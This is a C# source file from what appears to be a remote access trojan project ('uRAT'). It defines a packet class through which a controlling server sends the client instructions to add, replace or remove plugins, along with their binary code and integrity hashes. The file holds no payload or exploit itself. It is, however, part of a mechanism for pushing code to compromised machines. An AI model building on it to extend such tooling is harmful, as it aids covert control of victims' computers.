using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using uNet2.Packet;

namespace uRAT.Client.Plugin.Synchronization.Packets
{
    internal class PluginActionPacket : IDataPacket
    {
        internal enum PluginAction : byte
        {
            Add = 0,
            Replace = 1,
            Remove = 2
        }

        internal class PluginActionData
        {
            public PluginAction Action { get; set; }
            public Guid PluginGuid { get; set; }
            public byte[] IntegrityHash { get; set; }
            public byte[] PluginData { get; set; }

            public PluginActionData(PluginAction action, Guid pluginGuid, byte[] integrityHash, byte[] pluginData)
            {
                Action = action;
                PluginGuid = pluginGuid;
                IntegrityHash = integrityHash;
                PluginData = pluginData;
            }

            public PluginActionData()
            {
   
            }
        }

        public int PacketId
        {
            get { return -2; }
        }

        public List<PluginActionData> Actions { get; set; }

        public PluginActionPacket()
        {
            Actions = new List<PluginActionData>();
        }

        public void SerializeTo(Stream stream)
        {

        }

        public void DeserializeFrom(Stream stream)
        {
            var br = new BinaryReader(stream);
            var count = br.ReadInt32();
            for (var i = 0; i < count; i++)
            {
                var pluginActionDat = new PluginActionData
                {
                    Action = (PluginAction) br.ReadByte(),
                    PluginGuid = new Guid(br.ReadBytes(16)),
                    IntegrityHash = br.ReadBytes(32)
                };

                var size = br.ReadInt32();
                pluginActionDat.PluginData = br.ReadBytes(size);
                Actions.Add(pluginActionDat);
            }
        }
    }
}
